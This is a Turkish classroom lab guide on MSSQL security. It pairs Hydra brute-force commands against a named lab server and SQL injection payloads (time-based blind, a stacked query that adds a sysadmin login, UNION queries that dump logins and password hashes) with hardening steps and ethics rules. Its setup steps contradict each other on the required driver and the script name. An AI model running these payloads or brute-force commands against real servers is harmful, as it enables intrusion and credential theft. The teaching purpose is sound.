# 🛡 Veritabanı Güvenliği Lab Kılavuzu

> **Ders Süresi:** 3 saat | **Seviye:** Başlangıç–Orta | **Platform:** Windows + Kali Linux

---

## 📋 Ön Koşullar

| Araç | Amaç | Kurulum |
|------|------|---------|
| Python 3.x | Lab uygulamasını çalıştırmak | python.org — "Add to PATH" işaretle |
| flask + pymssql | Web app + DB bağlantısı | Uygulama **otomatik kurar** |
| SSMS | SQL sorguları | Microsoft sitesinden |
| Kali Linux | Brute force araçları | VM (Proxmox/VMware) |

> **Not:** pyodbc veya ODBC Driver kurulumu gerekmez. `labsenaryo001.py` çalıştırıldığında tüm bağımlılıklar otomatik yüklenir.

---

## 🔌 Sunucu Bilgileri

```
Sunucu IP  : 155.223.166.100
Port       : 51433
Bağlantı   : SQL Server Authentication
```

**SSMS bağlantısı:** `Server name` alanına `155.223.166.100,51433` yazın (virgülle).

---

## 🚀 Lab Uygulamasını Çalıştırma

```bash
# 1. pyodbc kurulumu
pip install pyodbc

# 2. Uygulamayı başlat
python dbsecurity_lab.py
```

### Uygulama Sekmeleri

| Sekme | İçerik |
|-------|--------|
| Normal Veri Girişi | Parametrik sorgu — SQLi'ye karşı korumalı |
| SQLi Test Alanı | String birleştirme — kasıtlı güvensiz |
| DB Kurulum | Veritabanı ve tablo oluşturma |
| Brute Force Rehberi | Hydra/Medusa komutları |

---

## 📚 Bölüm 1 — Veritabanı Güvenliği Temelleri (00:00–00:30)

### CIA Üçgeni

- **Gizlilik (Confidentiality):** Yetkisiz erişim engeli → şifreleme, erişim kontrolü
- **Bütünlük (Integrity):** İzinsiz değişiklik engeli → audit log, trigger
- **Erişilebilirlik (Availability):** Sürekli hizmet → yedekleme, DoS koruması

### Güvenlik Katmanları

```
[İnternet]
     ↓
[Firewall — port 51433 kısıtlı]
     ↓
[MSSQL — login policy, audit]
     ↓
[Uygulama — parametrik sorgu, least privilege]
     ↓
[Veri — şifreleme, maskeleme]
```

---

## 🗄 Bölüm 2 — Lab Kurulumu (01:00–01:30)

### Adım 1 — Veritabanı Oluştur

```sql
-- "DB Kurulum" sekmesinde veya SSMS'te:
CREATE DATABASE ogrenci_12345;  -- kendi numaranızı yazın
USE ogrenci_12345;
```

### Adım 2 — SUGGESTION Tablosunu Oluştur

```sql
CREATE TABLE SUGGESTION (
    ID              INT IDENTITY(1,1) PRIMARY KEY,
    NAMESURNAME     NVARCHAR(100)  NOT NULL,
    DATE_           DATETIME       DEFAULT GETDATE(),
    SUGGESTION_TEXT NVARCHAR(MAX)
);
```

### Adım 3 — Veri Ekle ve Listele

```sql
INSERT INTO SUGGESTION (NAMESURNAME, SUGGESTION_TEXT)
VALUES (N'Ad Soyad', N'İlk önerim');

SELECT * FROM SUGGESTION;
SELECT @@IDENTITY;  -- son eklenen satırın ID'si
```

---

## 💥 Bölüm 3 — Brute Force Lab (01:30–02:00)

### Kali'de Hydra

```bash
# Temel brute force:
hydra -l sa -P /usr/share/wordlists/rockyou.txt \
  mssql://155.223.166.100:51433

# Hız sınırlı (lockout'tan kaçınmak için):
hydra -l sa -P test_pass.txt -t 4 -W 3 \
  mssql://155.223.166.100:51433

# Kullanıcı listesiyle:
hydra -L users.txt -P passwords.txt \
  mssql://155.223.166.100:51433
```

### Test Parola Listesi Hazırlama

```bash
echo -e "password\nPassword1\nP@ssw0rd\nMssql123!\nSa123456\nAbc123" \
  > test_pass.txt
```

### Saldırıyı SSMS'te İzleme

```sql
-- Başarısız girişleri gör:
EXEC xp_readerrorlog 0, 1, N'Login failed';
```

---

## 💉 Bölüm 4 — SQL Injection Lab (02:00–02:30)

### 4a. INSERT SQLi — `labsenaryo001.py` Ana Sayfa

Uygulamayı başlatın: `python labsenaryo001.py` → `http://localhost:5000`

**Senaryo 1 — Temel Kırma**
```
Ad Soyad alanına: ' );--
```
Terminalde oluşan SQL sorgusuna bakın.

**Senaryo 2 — Time-Based Blind**
```
Öneri alanına: ');IF(1=1) WAITFOR DELAY '0:0:5';--
```
5 saniye gecikmesi = zafiyet kanıtı.

**Senaryo 3 — Stacked Query ile Kullanıcı Ekleme**
```sql
');CREATE LOGIN [testuser] WITH PASSWORD=N'Test123!';
ALTER SERVER ROLE [sysadmin] ADD MEMBER [testuser];SELECT 1;--
```

---

### 4b. UNION-Based SQLi — `/arama` Sayfası

Adres: `http://localhost:5000/arama`

#### Adım 1 — Sütun Sayısını Bul (ORDER BY)

```
' ORDER BY 1--   → hata yok
' ORDER BY 2--   → hata yok
' ORDER BY 4--   → hata yok
' ORDER BY 5--   → HATA! → 4 sütun var
```

#### Adım 2 — UNION NULL Testi

```
' UNION SELECT NULL,NULL,NULL,NULL--
```
Hata yoksa UNION çalışıyor.

#### Adım 3 — Hangi Sütun Ekranda Görünüyor?

```
' UNION SELECT 1,'TEST_VERISI',3,'TEST2'--
```
Sayfada `TEST_VERISI` varsa → 2. sütun ekranda görünüyor.

#### Adım 4 — Veri Çek

```sql
-- Veritabanı listesi:
' UNION SELECT 1,name,3,4 FROM sys.databases--

-- Kullanıcı hesapları:
' UNION SELECT 1,name,3,4 FROM sys.server_principals WHERE type='S'--

-- Parola hash'leri:
' UNION SELECT 1,name,3,CONVERT(varchar(max),password_hash,1) FROM sys.sql_logins--

-- Tablo listesi:
' UNION SELECT 1,TABLE_NAME,3,4 FROM INFORMATION_SCHEMA.TABLES--
```

#### Adım 5 — Koruma: Parametrik Sorgu

```python
# YANLIŞ — zafiyetli:
query = "SELECT ... WHERE NAMESURNAME = '" + girdi + "'"

# DOĞRU — parametrik:
cursor.execute("SELECT ... WHERE NAMESURNAME = %s", (girdi,))
```

---

## 🔒 Bölüm 5 — MSSQL Güvenlik Sertleştirme (02:30–03:00)

### SA Hesabını Kapat

```sql
ALTER LOGIN [sa] DISABLE;
```

### Güçlü Parola Politikası

```sql
ALTER LOGIN [kullanici] WITH
  CHECK_POLICY = ON,
  CHECK_EXPIRATION = ON;
```

### Tehlikeli Özellikleri Kapat

```sql
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;
```

### Audit Oluştur

```sql
CREATE SERVER AUDIT GuvenlikAudit
TO FILE (FILEPATH = N'C:\AuditLogs\')
WITH (ON_FAILURE = CONTINUE);

ALTER SERVER AUDIT GuvenlikAudit WITH (STATE = ON);

CREATE SERVER AUDIT SPECIFICATION LoginSpec
FOR SERVER AUDIT GuvenlikAudit
ADD (FAILED_LOGIN_GROUP)
WITH (STATE = ON);
```

### Least Privilege

```sql
-- Uygulama kullanıcısı oluştur:
CREATE LOGIN [AppLogin] WITH PASSWORD = N'GucluParola!';
CREATE USER  [AppUser]  FOR LOGIN [AppLogin];

-- Yalnızca gerekli izinler:
GRANT SELECT, INSERT ON dbo.SUGGESTION TO [AppUser];
-- sysadmin verme!
```

### Parameterized Query (Uygulama Kodu)

```python
# DOĞRU — SQLi'ye karşı korumalı:
cursor.execute(
    "INSERT INTO SUGGESTION (NAMESURNAME, SUGGESTION_TEXT) VALUES (?, ?)",
    (name, text)
)

# YANLIŞ — SQLi açığı:
sql = f"INSERT INTO ... VALUES ('{name}', '{text}')"
cursor.execute(sql)  # asla böyle yapma!
```

---

## ⚠️ Etik Kurallar

- Bu teknikler **yalnızca** lab ortamında ve izin verilen sistemlerde uygulanır.
- Başkasının veritabanına zarar vermek **TCK 243–244** kapsamında suçtur.
- Lab sonrası oluşturulan test kullanıcıları temizlenmelidir.

---

## 📌 Hızlı Referans

| Komut | Amaç |
|-------|------|
| `hydra -l sa -P list.txt mssql://IP:PORT` | Brute force |
| `EXEC xp_readerrorlog 0,1,N'Login failed'` | Hata logları |
| `ALTER LOGIN [sa] DISABLE` | SA'yı kapat |
| `EXEC sp_configure 'xp_cmdshell',0;RECONFIGURE` | xp_cmdshell kapat |
| `GRANT SELECT ON tablo TO kullanici` | Least privilege |
